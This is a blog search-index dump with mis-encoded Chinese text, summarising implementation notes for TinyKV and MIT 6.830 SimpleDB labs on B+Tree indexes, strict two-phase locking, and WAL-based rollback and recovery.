","date":"2022-05-21","objectID":"/posts/tinykv-impl/:4:2","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"Part B è¿™éƒ¨åˆ†æ¯”è¾ƒç®€å•ï¼Œå®ç°å››ä¸ªæ“ä½œï¼Œä¸»è¦æ˜¯ç”¨äºæ£€æŸ¥äº‹åŠ¡çŠ¶æ€ï¼Œå†³å®šå›æ»šè¿˜æ˜¯æäº¤ã€‚ KvScanï¼šç”¨äºæŒ‰ Key é¡ºåºæ‰«æï¼Œç±»ä¼¼KvGetä¸€æ ·å®ç°å³å¯ï¼› KvCheckTxnStatusï¼šç”¨äºæ£€æŸ¥äº‹åŠ¡é”çš„çŠ¶æ€ï¼› KvBatchRollbackï¼šç”¨äºæ‰¹é‡å›æ»šæ•°æ®ï¼› KvResolveLockï¼šä½¿ç”¨KvCheckTxnStatusæ£€æŸ¥é”çš„çŠ¶æ€åï¼Œå†ä½¿ç”¨KvResolveLockå›æ»šæˆ–è€…æäº¤ã€‚ ","date":"2022-05-21","objectID":"/posts/tinykv-impl/:4:3","tags":null,"title":"TinyKVå®ç°æ€»ç»“","uri":"/posts/tinykv-impl/"},{"categories":null,"content":"ç®€ä»‹ åœ¨lab4ä¸­ï¼Œæˆ‘ä»¬å®ç°çš„äº‹åŠ¡æ˜¯åŸºäºNO STEAL/FORCEçš„ï¼Œno stealä¼šå½±å“BufferPoolçš„å¯ç”¨ç©ºé—´ï¼Œç”šè‡³å¦‚æœäº‹åŠ¡çš„write setå¤ªå¤§äº†ï¼ŒBufferPoolå¤ªå¤§äº†ï¼Œäº‹åŠ¡ä¼šæ ¹æœ¬æ— æ³•æ‰§è¡Œï¼›Forceä¼šå¯¼è‡´I/Oçš„å¼€é”€ç‰¹åˆ«å¤§ï¼Œå¹¶ä¸”commitå‰å†™å¤šä¸ªpageæ—¶å¯èƒ½ä¼šcrashï¼Œæ— æ³•ä¿è¯åŸå­æ€§ã€‚æ‰€ä»¥è¦åšåŸºäºWALçš„Rollbackå’ŒRecoveryã€‚ Recoveryç®—æ³•åŒ…å«ä¸¤éƒ¨åˆ†ï¼š ä¸ºäº†ç¡®ä¿DBMSèƒ½å¤Ÿä»failureä¸­æ¢å¤ï¼Œåœ¨äº‹åŠ¡çš„æ­£å¸¸æ‰§è¡Œè¿‡ç¨‹ä¸­éœ€è¦åšçš„äº‹ï¼› åœ¨äº‹åŠ¡æ‰§è¡Œä¸­ï¼Œå†™å…¥WALã€‚ä»…å½“äº‹åŠ¡å¯¹åº”çš„logéƒ½è¢«æŒä¹…åŒ–ä¹‹åï¼Œæ‰èƒ½æäº¤äº‹åŠ¡ï¼›å½“äº‹åŠ¡abortåï¼Œå¯ä»¥åˆ©ç”¨WAL logå›æ»šã€‚å®šæœŸå‘æŒä¹…åŒ–å­˜å‚¨å†™å…¥checkpointï¼Œè®°å½•å½“å‰æ´»è·ƒçš„transactionså’Œdirty pagesã€‚ WALåŒ…å«redoå’Œundoä¿¡æ¯ï¼š redo logå¿…é¡»æ˜¯physicalçš„ï¼Œå¦‚å¯¹DBå†…æŸæ•°æ®ç»“æ„çš„ä¿®æ”¹ï¼Œå› ä¸ºcrashæ—¶ï¼ŒDBMSå¯èƒ½ä¸æ»¡è¶³â€œaction consistentâ€ï¼Œä¸€äº›æ“ä½œå¯èƒ½åŒ…å«ä¸€ç³»åˆ—éåŸå­æ“ä½œï¼Œä¾‹å¦‚æ’å…¥ä¸€æ¡æ•°æ®ï¼Œindexä¸­æ’å…¥äº†ï¼Œä½†æ˜¯HeapFileä¸­è¿˜æ²¡æœ‰ã€‚ undo logå¿…é¡»æ—¶logicalçš„ï¼Œå¦‚delete/insertä¸€æ¡DBä¸­çš„Tupleï¼Œå› ä¸ºå½“æˆ‘ä»¬undoæ—¶ï¼ŒçŠ¶æ€å¯èƒ½å’Œå†™å…¥è¯¥logæ—¶ä¸ä¸€è‡´äº†ã€‚å¦‚ä¸‹å›¾ï¼Œundo T2æ—¶ï¼Œå¦‚æœæŠŠPage Nç›´æ¥æ¢å¤åˆ°WBä¹‹å‰çš„çŠ¶æ€ï¼Œé‚£T1çš„ä¿®æ”¹å°±ä¸¢å¤±äº†ã€‚ å½“DBMS crashåï¼Œéœ€è¦åšä¸€äº›æ“ä½œæ¥æ¢å¤æ•°æ®åº“çš„çŠ¶æ€ï¼Œä¿è¯ACDï¼ˆéš”ç¦»æ˜¯2PL/MVCCçš„äº‹äº†ï¼‰ã€‚ ä»æœ€è¿‘checkpointå¼€å§‹åˆ†æï¼Œå¾—å‡ºéœ€è¦redoå’Œundoçš„äº‹åŠ¡åˆ—è¡¨ redo undo SimpleDBæä¾›çš„æ—¥å¿—ä»£ç äº§ç”Ÿçš„æ—¥å¿—è®°å½•ç”¨äºè¿›è¡Œphysicalçš„å…¨é¡µundoå’Œredoã€‚å½“ä¸€ä¸ªpageç¬¬ä¸€æ¬¡è¢«è¯»å…¥æ—¶ï¼Œä»£ç ä¼šè®°å½•è¯¥é¡µé¢çš„åŸå§‹å†…å®¹ï¼Œä½œä¸ºä¸€ä¸ªbefore-imageã€‚å½“ä¸€ä¸ªäº‹åŠ¡æ›´æ–°è¿‡ä¸€ä¸ªpageåï¼Œå¯¹åº”çš„æ—¥å¿—recordï¼Œä¼šå°†è®°å½•çš„ä¿®æ”¹å‰çš„pageå†…å®¹ä½œä¸ºbefore-imageï¼Œå°†ä¿®æ”¹åçš„å½“å‰pageå†…å®¹ä½œä¸ºafter-imageã€‚ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨before-imageåœ¨abortæ—¶å›æ»šï¼Œæˆ–è€…åœ¨RecoveryæœŸé—´æ’¤é”€loser transactionsï¼›ä½¿ç”¨after-imageåœ¨RecoveryæœŸé—´redo winner transactionsã€‚ ä¹‹æ‰€ä»¥å¯ä»¥é€šè¿‡æ•´ä¸ªé¡µé¢çš„physical UNDOæ¥å®Œæˆabortå’Œæ¢å¤ï¼Œæ˜¯å› ä¸ºSimpleDBä½¿ç”¨é¡µçº§é”å¹¶ä¸”æ²¡æœ‰é‚£ç§å¯èƒ½åœ¨undoæ—¶ä¸æ—¥å¿—è¢«å†™å…¥æ—¶ç»“æ„ä¸ä¸€è‡´çš„ç´¢å¼•ã€‚é¡µçº§é”çš„ç®€åŒ–ä½œç”¨æ˜¯ï¼šå¦‚æœä¸€ä¸ªäº‹åŠ¡ä¿®æ”¹äº†ä¸€ä¸ªPageï¼Œå®ƒä¸€å®šæœ‰è¯¥Pageçš„ç‹¬å é”ï¼Œè¿™æ„å‘³ç€æ²¡æœ‰å…¶ä»–äº‹åŠ¡åœ¨åŒæ—¶ä¿®æ”¹å®ƒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†ç›–æ•´ä¸ªé¡µé¢æ¥UNDOå¯¹å®ƒçš„ä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯ä¸‹å›¾ä¸­ï¼ŒT2 commitå‰ï¼ŒT1æ²¡æœ‰æœºä¼šå†™Page Nï¼Œphysical undoä¸ä¼šè¦†ç›–å…¶ä»–äº‹åŠ¡çš„ä¿®æ”¹ã€‚ SimpleDBæ—¥å¿—çš„æ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab6-rollback-and-recovery/:1:0","tags":null,"title":"MIT 6.830 Lab6 Rollback and Recovery","uri":"/posts/mit-6.830-lab6-rollback-and-recovery/"},{"categories":null,"content":"Exercises ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab6-rollback-and-recovery/:2:0","tags":null,"title":"MIT 6.830 Lab6 Rollback and Recovery","uri":"/posts/mit-6.830-lab6-rollback-and-recovery/"},{"categories":null,"content":"1. Rollback SimpleDBæä¾›äº†æ•°æ®ç»“æ„tidToFirstLogRecordæ¥ä¿å­˜æ¯ä¸ªäº‹åŠ¡åœ¨logfileé‡Œçš„offsetã€‚æˆ‘ä»¬åªéœ€è¦ä»å¼€å§‹å¤„ä¸€ç›´è¯»ï¼Œä¿å­˜æ¯ä¸ªpageçš„before imageï¼Œç„¶åå°†æ‰€æœ‰before imageå†™å›diskï¼Œå³å¯å®Œæˆrollbackã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab6-rollback-and-recovery/:2:1","tags":null,"title":"MIT 6.830 Lab6 Rollback and Recovery","uri":"/posts/mit-6.830-lab6-rollback-and-recovery/"},{"categories":null,"content":"2. Recovery å¦‚æœæ•°æ®åº“crashå¹¶ä¸”é‡å¯ï¼Œé‚£ä¹ˆä¼šåœ¨å¼€å§‹æ‰§è¡Œäº‹åŠ¡ä¹‹å‰ï¼Œå…ˆè°ƒç”¨LogFile.recover()è¿›è¡Œæ¢å¤ã€‚ å¦‚æœæœ‰ï¼Œè¯»å–æœ€æ–°çš„checkpointï¼› ä»checkpointå‘åæ‰«æï¼Œæ‰¾å‡ºloser transactionï¼ˆcheckpointä¸­è®°å½•çš„active txï¼Œä½†åç»­æœªcommitçš„ï¼›checkpointåå¼€å§‹çš„æ–°txï¼Œä½†æœªcommitçš„ï¼‰ï¼Œredo checkpointåæ›´æ–°è®°å½•ã€‚å› ä¸ºè°ƒç”¨LogFile.logCheckpoint()ä¼šæŠŠæ‰€æœ‰dirty pageå†™å…¥diskï¼Œæ‰€ä»¥å¯ä»¥å®‰å…¨çš„ä»ckeckpointå¼€å§‹redoï¼› undo loser transactionsï¼› SimpleDBä¸­ï¼Œabortçš„äº‹åŠ¡ä¸è¦redoï¼Œä¹Ÿä¸è¦undoã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab6-rollback-and-recovery/:2:2","tags":null,"title":"MIT 6.830 Lab6 Rollback and Recovery","uri":"/posts/mit-6.830-lab6-rollback-and-recovery/"},{"categories":null,"content":"ç®€ä»‹ å®ç°å‰4ä¸ªlabåï¼ŒSimpleDBå·²ç»æ˜¯ä¸€ä¸ªæ”¯æŒäº‹åŠ¡å’ŒCRUDçš„ç®€å•æ•°æ®åº“äº†ï¼Œä½†æ˜¯æ€§èƒ½å¤ªä½äº†éšä¾¿ä¸€ä¸ªç‚¹æŸ¥è¯¢æˆ–è€…èŒƒå›´æŸ¥è¯¢ï¼Œéƒ½è¦æ‰«ææ•´ä¸ªtableå¯¹åº”çš„DbFileã€‚æœ¬labéœ€è¦å®ç°ä¸€ä¸ªB+Treeç´¢å¼•ï¼Œç”¨äºå¿«é€ŸæŸ¥æ‰¾å’Œrange scanã€‚SimpleDBæä¾›äº†å®ç°æ ‘æ‰€éœ€çš„æ‰€æœ‰low-levelä»£ç ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±å®ç°ä½¿ç”¨æ ‘æœç´¢ï¼Œåˆ†è£‚pageï¼Œåœ¨pageé—´é‡æ–°åˆ†é…tuplesï¼Œåˆå¹¶pageçš„æ–¹æ³•ã€‚ B+Treeæ ‘çš„å¶èŠ‚ç‚¹ï¼Œå¯ä»¥ç›´æ¥åŒ…å«Tupleï¼Œä¹Ÿå¯ä»¥åŒ…å«Tupleçš„RecordIdï¼Œä¸ºäº†ç®€åŒ–ï¼Œæœ¬å®éªŒçš„å¶èŠ‚ç‚¹ï¼Œç›´æ¥å­˜å‚¨Tupleã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:1:0","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"Exercises ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:2:0","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"1. Search BTreeFileåŒ…å«å››ç§ä¸åŒçš„pageï¼š é¦–å…ˆæ˜¯BTreeInternalPageå’ŒBTreeLeafPageï¼ŒBTreePageæ¥å£åŒ…å«äº†å¯¹è¿™ä¸¤ç§pageçš„æŠ½è±¡ï¼›BTreeHeaderPageç”¨äºè¿½è¸ªå“ªäº›pageæ­£åœ¨è¢«ä½¿ç”¨ï¼›BTreeRootPtrPageå­˜åœ¨äºæ¯ä¸ªBTreeFileçš„å¤´éƒ¨ï¼ŒæŒ‡å‘RootPageå’Œç¬¬ä¸€ä¸ªHeaderPageã€‚ é¦–å…ˆæˆ‘ä»¬éœ€è¦å®ç°å¯¹B+Treeçš„æœç´¢ï¼Œå¯¹äºç»™å®šçš„keyï¼Œè¿”å›å…¶æ‰€åœ¨çš„LeafPageï¼›å¦‚ä¸‹å›¾ï¼Œç»™key1ï¼Œåº”è¯¥è¿”å›å·¦ä¾§pageã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœç»™å‡ºkey6ï¼Œä¹Ÿåº”è¯¥è¿”å›å·¦ä¾§pageï¼Œå¦åˆ™æ²¿ç€pageæŸ¥æ‰¾æ—¶ï¼Œä¼šä¸¢æ‰å·¦ä¾§è¿™ä¸ªtupleã€‚ åœ¨æœ¬å®éªŒä¸­ï¼Œè¯»å–pageéƒ½è¦ä½¿ç”¨BTreeFile.getPage()ï¼Œå…¶å†…éƒ¨ä¹Ÿæ˜¯è°ƒç”¨BufferPool.getPage()ï¼Œä½†æ˜¯æ·»åŠ äº†æ›´å¤šå¯¹dirty pageçš„è¿½è¸ªã€‚HeapFileæ‰§è¡ŒinsertTuple/deleteTupleæ—¶ï¼Œåªä¼šè¿”å›ä¸€ä¸ªdirty pageï¼Œä½†æ˜¯B+Treeç”±äºæ¶‰åŠåˆ°èŠ‚ç‚¹çš„split/mergeï¼Œå¯èƒ½ä¼šæœ‰å¾ˆå¤šdirty pageã€‚ åœ¨findLeafPage()ä¸­ï¼Œè·å–çš„Internal Pageéƒ½åº”è¯¥æ˜¯READ_ONLYæƒé™ï¼ŒLeaf Pageåº”è¯¥æ˜¯å‚æ•°ç»™å®šçš„æƒé™ã€‚è¿™æ˜¯B+Treeè®¿é—®åŠ é”çš„ç­–ç•¥ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:2:1","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"2. Insert æ’å…¥éœ€è¦é¦–å…ˆä½¿ç”¨findLeafPage()æ‰¾åˆ°å¯¹åº”çš„Leaf Pageï¼Œç„¶åå¯èƒ½æ¶‰åŠåˆ°Leaf Pageçš„splitï¼Œsplitåéœ€è¦å‘parent pageæ’å…¥ä¸€ä¸ªæ–°çš„keyï¼Œè¿™åˆå¯èƒ½æ¶‰åŠåˆ°parentçš„splitï¼Œç›´åˆ°Root Pageã€‚ SimpleDBååˆ†å–‚é¥­ï¼Œæä¾›çš„getParentWithEmptySlots()å¸®æˆ‘ä»¬å¤„ç†äº†è¿™ä¸ªé€’å½’è¿‡ç¨‹ï¼Œæˆ‘ä»¬åªéœ€è¦å®ç°splitLeafPage()å’ŒsplitInternalPage()ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œsplit leaf pageï¼Œæ˜¯å°†ä¸€ä¸ªpageä»ä¸­é—´ä¸€åˆ†ä¸ºäºŒï¼Œå°†å³ä¾§pageç¬¬ä¸€ä¸ªkey â€copyâ€œåˆ°parentä¸­ã€‚ split internal pageæ˜¯å°†pageä¸­é—´çš„key â€œpushâ€åˆ°parentä¸­ï¼Œç„¶åå°†å…¶ä¸¤è¾¹çš„keyä¸€åˆ†ä¸ºäºŒã€‚ æ³¨æ„B+Treeéœ€è¦æ—¶åˆ»ä¿æŒä»¥ä¸‹ç‰¹æ€§ï¼š å¦‚æœparentæŒ‡å‘childï¼Œé‚£ä¹ˆchildå¿…é¡»æŒ‡å›åŒä¸€ä¸ªparentï¼› å¦‚æœä¸€ä¸ªleafæŒ‡å‘ä¸€ä¸ªright siblingï¼Œé‚£ä¹ˆright siblingå¿…é¡»å°†å®ƒä½œä¸ºleft siblingï¼› ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªLeafï¼Œå¯¹åº”siblingå¿…é¡»æŒ‡å‘nullï¼› RecordIdå¿…é¡»ä¸pageåŒ¹é…ï¼› childä¸ºnon-leafèŠ‚ç‚¹çš„keyï¼Œå¿…é¡»æ¯”left childçš„keyå¤§ï¼Œæ¯”right childçš„keyå°ï¼› childä¸ºleafèŠ‚ç‚¹çš„keyï¼Œå¿…é¡»å¤§äºç­‰äºleft childçš„keyï¼Œå°äºç­‰äºright childçš„keyï¼› ä¸€ä¸ªèŠ‚ç‚¹çš„childï¼Œè¦ä¹ˆéƒ½æ˜¯non-leafï¼Œè¦ä¹ˆéƒ½æ˜¯leafã€‚ å¦‚æœæµ‹è¯•ä¸­å‡ºç°äº†é”™è¯¯ï¼Œå¯ä»¥ä½¿ç”¨SimpleDBæä¾›çš„BTreeCheckerï¼Œæ£€æŸ¥æ˜¯å¦æ»¡è¶³ä¸Šè¿°ç‰¹æ€§ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:2:2","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"3. Delete åˆ é™¤Tupleå¯ä»¥ä½¿ç”¨RecordIdç›´æ¥ç»™å¯¹åº”çš„Leaf PageåŠ é”ï¼Œç„¶ååˆ é™¤ï¼›åˆ é™¤åå¦‚æœLeaf Pageçš„Tupleæ•°é‡å°‘äºåŠæ»¡ï¼Œå¯èƒ½ä¼šæœ‰ä¸¤ç§æƒ…å†µã€‚ å¦‚æœsiblingå¤šäºåŠæ»¡ï¼Œé‚£ä¹ˆå¯ä»¥ä»sibling stealä¸€å®šæ•°é‡çš„tupleï¼Œä½¿å¾—ä¸¤è€…å¹³å‡ï¼Œstealåï¼Œè¿˜éœ€è¦ä¿®æ”¹parent entryä¸­çš„keyã€‚ å¦‚æœsiblingä¹Ÿå°‘äºç­‰äºåŠæ»¡ï¼Œé‚£ä¹ˆéœ€è¦å’Œsibling mergeï¼Œå¹¶ä¸”åˆ é™¤parentä¸­çš„entryï¼Œè€Œå¯¹parentä¸­çš„entryè¿›è¡Œåˆ é™¤ï¼Œåˆ™å¯èƒ½ä¼šè§¦å‘parentçš„é€’å½’stealæˆ–è€…mergeã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:2:3","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"4. Transactions å¦‚æœæƒ³è¦å…è®¸å¤šçº¿ç¨‹åŒæ—¶è®¿é—®B+Treeï¼Œè¦é˜²æ­¢ä»¥ä¸‹ä¸¤ç§é—®é¢˜ï¼š å¤šä¸ªthreadåŒæ—¶ä¿®æ”¹ä¸€ä¸ªnodeçš„å†…å®¹ï¼› ä¸€ä¸ªthreadæ­£åœ¨traversing treeï¼Œå…¶ä»–çº¿ç¨‹åœ¨merge/split nodeã€‚ SimpleDBä¸­çš„åŠ é”ç­–ç•¥å¾ˆç®€å•ï¼š å¯¹äºscanï¼Œä»root pageåˆ°leaf pageï¼ŒåŠ è¯»é”ï¼› å¯¹äºinsertï¼Œä»root pageå¼€å§‹çš„æ‰€æœ‰internal pageéƒ½åŠ è¯»é”ï¼ŒLeaf pageåŠ å†™é”ï¼Œå¦‚æœæ¶‰åŠåˆ°splitï¼Œå°±å¯¹siblingå’ŒparentåŠ å†™é”ï¼Œå¹¶ä¸”ç»§ç»­é€’å½’å‘ä¸ŠåŠ å†™é”ï¼› å¯¹äºdeleteï¼Œç›´æ¥å¯¹leaf pageåŠ å†™é”ï¼Œå¦‚æœæ¶‰åŠåˆ°steal/mergeï¼Œå†å¯¹siblingå’ŒparentåŠ å†™é”ï¼Œå¹¶ä¸”ç»§ç»­é€’å½’å‘ä¸ŠåŠ å†™é”å¤„ç†ã€‚ CMU 15-445ä¸­è®²è§£äº†ä¸€äº›æ›´å¥½çš„åŠ é”æ–¹æ³•ï¼š å¦‚æœå‰é¢å¯¹äºlab4 transactionå’ŒB+Treeçš„å®ç°éƒ½æ­£ç¡®ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„B+Treeåº”è¯¥æ˜¯è‡ªåŠ¨æ»¡è¶³äº‹åŠ¡çš„ã€‚BTreeTestæ˜¯æ•´ä¸ªSimpleDBæœ€éš¾çš„æµ‹è¯•ï¼Œå¹¶å‘é‡æ¯”è¾ƒå¤§ï¼Œå¯¹äº‹åŠ¡å’ŒB+Treeçš„é—®é¢˜åŸºæœ¬éƒ½èƒ½æµ‹è¯•å‡ºæ¥ã€‚å¦‚æœæµ‹è¯•å‡ºäº†é”™è¯¯ï¼Œå¯ä»¥ä½¿ç”¨BTreeCheckeræ¥æ£€æŸ¥B+Treeåœ¨å¹¶å‘æ—¶æœ‰æ— æ ¼å¼é”™è¯¯ï¼›å¯ä»¥å…ˆå°†æµ‹è¯•ç”¨ä¾‹çš„å¹¶å‘åº¦é™åˆ°èƒ½å¤ç°é”™è¯¯çš„æœ€ä½å€¼ï¼Œç„¶åè¾“å‡ºæ‰§è¡Œè¿‡ç¨‹è¿‡çš„åŠ é”ã€commitã€abortã€split/merge pageç­‰ä¿¡æ¯ï¼Œä¸€ç‚¹ä¸€ç‚¹æ¨¡æ‹Ÿï¼ŒèŠ±ä¸ªä¸€ä¸¤å¤©æ€»èƒ½debugå‡ºæ¥ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab5-simpledb-btree-index/:2:4","tags":null,"title":"MIT 6.830 Lab5 SimpleDB BTree Index","uri":"/posts/mit-6.830-lab5-simpledb-btree-index/"},{"categories":null,"content":"ç®€ä»‹ å®Œæˆå‰ä¸‰ä¸ªlabï¼ŒSimpleDBå·²ç»å…·æœ‰åŸºæœ¬çš„CRUDçš„èƒ½åŠ›ï¼Œä½†æ˜¯è¿˜ç¼ºå°‘äº‹åŠ¡ã€‚æœ¬labéœ€è¦å®ç°ä¸€ä¸ªç®€å•çš„åŸºäºé”çš„äº‹åŠ¡ç®¡ç†ç³»ç»Ÿã€‚éœ€è¦åœ¨ä»£ç é€‚å½“çš„ä½ç½®æ·»åŠ lock/unlockï¼Œå¹¶ä¸”trackäº‹åŠ¡æ‰€æŒæœ‰çš„é”å¹¶åœ¨äº‹åŠ¡éœ€è¦é”æ—¶æˆäºˆå®ƒã€‚ æœ¬labä½¿ç”¨ä¸¥æ ¼ä¸¤é˜¶æ®µé”ï¼ˆ2PLï¼‰åè®®ã€‚åœ¨2PLåè®®ä¸‹ï¼Œæ¯ä¸ªtransactionéƒ½ä¼šç»è¿‡ä¸¤ä¸ªé˜¶æ®µï¼šåœ¨ç¬¬ä¸€ä¸ªé˜¶æ®µé‡Œï¼Œtransactionæ ¹æ®éœ€æ±‚ä¸æ–­åœ°è·å–é”ï¼Œå«åš growing phase (expanding phase)ï¼›åœ¨ç¬¬äºŒä¸ªé˜¶æ®µé‡Œï¼Œtransactionå¼€å§‹é‡Šæ”¾å…¶æŒæœ‰çš„é”ï¼Œæ ¹æ®2PLçš„è§„åˆ™ï¼Œè¿™ä¸ªtransactionä¸èƒ½å†è·å¾—æ–°çš„é”ï¼Œå®ƒæ‰€æŒæœ‰çš„é”é€æ¸å‡å°‘ï¼Œå«åš shrinking phase (contracting phase)ã€‚è€Œstrict-2PLï¼Œåˆ™è¦æ±‚transactionåœ¨æ‰§è¡Œç»“æŸï¼ˆcommit/abortï¼‰æ—¶ç»Ÿä¸€é‡Šæ”¾æ‰€æœ‰é”ã€‚è¿™æ ·é¿å…äº†ä¸€ä¸ªtransaction abortåï¼Œå…¶ä»–transactionçº§è”abortã€‚ä¾‹å¦‚ï¼š tx Aï¼šlock page1ï¼Œ2ï¼Œ3 tx A: unlock 3 tx B: lock 3 // åŸºäºtx Açš„æ›´æ”¹æ‰§è¡Œäº‹åŠ¡ tx A: abort tx B: abort // cascading abort ACIDä¿è¯ Atomicityï¼šStrict 2PLå’Œç»†è‡´çš„bufferç®¡ç†ä¿è¯åŸå­æ€§ã€‚ Consistencyï¼šç”±äºåŸå­æ€§çš„å­˜åœ¨ï¼Œæ•°æ®åº“äº‹åŠ¡æ˜¯ä¸€è‡´çš„ã€‚SimpleDBä¸è§£å†³å…¶ä»–ä¸€è‡´æ€§é—®é¢˜ï¼ˆå¦‚keyç›¸å…³çš„ä¸€è‡´æ€§ï¼‰ã€‚ Isolationï¼šStrict 2PLä¿è¯éš”ç¦»æ€§ã€‚ Durabilityï¼šå¼ºåˆ¶çš„bufferç®¡ç†æœºåˆ¶ä¿è¯æŒä¹…æ€§ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:1:0","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"Recovery and Buffer Management ä¸ºäº†ç®€åŒ–å·¥ä½œï¼Œå»ºè®®å®ç°ä¸€ä¸ªNO STEAL/FORCE buffer management policyã€‚ STEALï¼šæ˜¯å¦å…è®¸æœªæäº¤çš„transactionè¦†ç›–æŒä¹…åŒ–å­˜å‚¨ä¸­å¯¹è±¡çš„æœ€æ–°æäº¤å€¼ï¼ˆå¯¹åº”SimpleDBï¼Œå³æ˜¯å¦å…è®¸åœ¨äº‹åŠ¡æœªcommitæ—¶ï¼Œå°†å…¶ç›¸å…³çš„dirty pageå†™å…¥diskï¼‰ã€‚ FORCEï¼šå…è®¸äº‹åŠ¡æäº¤å‰ï¼Œæ˜¯å¦è¦æ±‚å…¶ä½œå‡ºçš„ä¿®æ”¹éƒ½åæ˜ åˆ°æŒä¹…åŒ–å­˜å‚¨ä¸Šï¼ˆå¯¹åº”SimpleDBï¼Œå³åœ¨äº‹åŠ¡commitå‰ï¼Œæ˜¯å¦è¦å¼ºåˆ¶å°†å…¶å¯¹åº”çš„æ‰€æœ‰dirty pageå†™åˆ°diskï¼‰ã€‚ ä¸ºäº†è¿›ä¸€æ­¥ç®€åŒ–å·¥ä½œï¼Œå‡è®¾SimpleDBåœ¨æ‰§è¡ŒtransactionCompleteæ“ä½œæ—¶ï¼Œä¸ä¼šcrashã€‚ ä¸Šè¿°ä¸‰ç‚¹æ„å‘³ç€æœ¬labä¸éœ€è¦å®ç°log-based recoveryï¼Œå› ä¸ºä¸éœ€è¦undoï¼ˆä¸æ·˜æ±°dirty pageï¼Œå³æœªæäº¤çš„æ›´æ”¹ä¸ä¼šå†™å…¥diskï¼‰ï¼›ä¹Ÿä¸éœ€è¦redoï¼ˆcommitæ—¶å¼ºåˆ¶å†™å‡ºpageåˆ°diskå¹¶ä¸”commitè¿‡ç¨‹ä¸­ä¸ä¼šcrashï¼‰ã€‚ ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:1:1","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"Exercises ","date":"2022-04-27","objectID":"/posts/mit-6.830-lab4-simpledb-transactions/:2:0","tags":null,"title":"MIT 6.830 Lab4 SimpleDB Transactions","uri":"/posts/mit-6.830-lab4-simpledb-transactions/"},{"categories":null,"content":"1. Granting Locks åœ¨SimpleDBï¼ˆä¾‹å¦‚BufferPoolï¼‰ä¸­æ·»åŠ ä»£ç ï¼Œå…è®¸è°ƒç”¨è€…ä»£è¡¨ç‰¹å®šäº‹åŠ¡è·å–æˆ–è€…é‡Šæ”¾å¯¹è±¡ä¸Šçš„é”ï¼ˆshared/exclusiveï¼‰ã€‚ å®éªŒå»ºè®®åœ¨pageçš„ç²’åº¦ä¸Šé”ï¼ŒSimpleDBçš„æ–‡æ¡£å’Œå•å…ƒéƒ½æµ‹è¯•å‡å®šå®ç°äº†pageç²’åº¦çš„é”ã€‚ éœ€è¦åˆ›å»ºä¸€äº›æ•°æ®ç»“æ„ï¼Œè·Ÿè¸ªæ¯ä¸ªäº‹åŠ¡æŒæœ‰å“ªäº›é”å¹¶åœ¨äº‹åŠ¡è·å–é”æ—¶è¿›è¡Œæ£€æŸ¥ï¼Œå†³å®šæ˜¯å¦æˆäºˆã€‚ å®ç°è¯»å†™é”ï¼š äº‹åŠ¡è¯»ä¹‹å‰ï¼Œå¿…é¡»ä¸Šshared lockã€‚ äº‹åŠ¡å†™ä¹‹å‰ï¼Œå¿…é¡»ä¸Šexclusive lockã€‚ å¤šä¸ªäº‹åŠ¡å¯ä»¥å¯¹åŒä¸€ä¸ªpageä¸Šshared lockã€‚ åªèƒ½æœ‰ä¸€ä¸ªäº‹åŠ¡å¯¹pageä¸Šexclusive lockã€‚ å¦‚æœtæ˜¯å”¯ä¸€æŒæœ‰page pä¸Šçš„shared lockçš„äº‹åŠ¡ï¼Œé‚£ä¹ˆå¯ä»¥å‡çº§ä¸ºexclusive lockã€‚ å¦‚æœä¸€ä¸ªäº‹åŠ¡å¯¹é”çš„è¯·æ±‚ä¸èƒ½ç«‹å³æ»¡è¶³ï¼Œåº”è¯¥é˜»å¡ï¼Œç­‰åˆ°lockå¯ç”¨ã€‚ä¸€å®šè¦æ³¨æ„race conditionã€‚ æˆ‘çš„å®ç°åŒ…å«ä¸€ä¸ªPageLockManagerç±»ï¼Œæ‰€æœ‰é”çš„ä¿¡æ¯è®°å½•åœ¨ä¸€ä¸ªHashMap\u003cPageId, HashMap\u003cTransactionId, 